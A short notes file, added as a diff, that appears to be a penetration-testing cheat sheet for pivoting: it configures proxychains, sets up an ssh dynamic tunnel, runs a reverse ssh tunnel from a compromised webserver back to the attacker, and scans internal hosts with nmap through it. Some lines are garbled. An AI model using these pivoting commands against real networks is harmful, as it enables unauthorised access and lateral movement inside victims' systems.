@@ -1,0 +1,42 @@
+PROXYCHAINS
+# configure proxychains
+
+edit the file proxychains.conf
+
+leafpad /etc/proxychains.conf -- at the bottom you will see 
+
+this is an example of what you type into your own machine to create a dynamic ssh tunnel
+ssh -D 127.0.0.1:8080 sean@192.168.31.251
+
+
+[ProxyList]
+# add proxy here ...
+#socks4 10.1.1.246 80
+#socks4 10.1.1.246 22sean/dev/null
+# meanwile
+# defaults set to "tor"
+#socks4 127.0.0.1 9050  <--under this line put "socks4127.0.0.1 8080"  <--this will use port 8080 
+
+--------------------------
+
+on the machine that is being attacked, use the following commands
+
+ssh -f -N -R 2222:127.0.0.1:22 <your username on your computer, IE root>@<your ip address>
+                   ^^^^^^^^^^^
+   This is the localhost IP of the webserver you hacked and will use to attack other machines.  The command will create the port forwarding shit
+
+--------------------------
+
+With your machine connecting to the machine you already compromised, you can now use proxychains to attack other machines in the network of the computer you compromised.
+
+I.E.
+
+
+proxychains nmap -T5 --top-ports=20 -sT -Pn 10.1.1.236
+
+----------------------------------------------------------
+ssh -D 127.0.0.1:8080 sean@192.168.31.251 <--your machine
+ssh -f -N -R 2222:127.0.0.1:22 root@192.168.30.53 <-----webserver you use to pivot
+
+
+
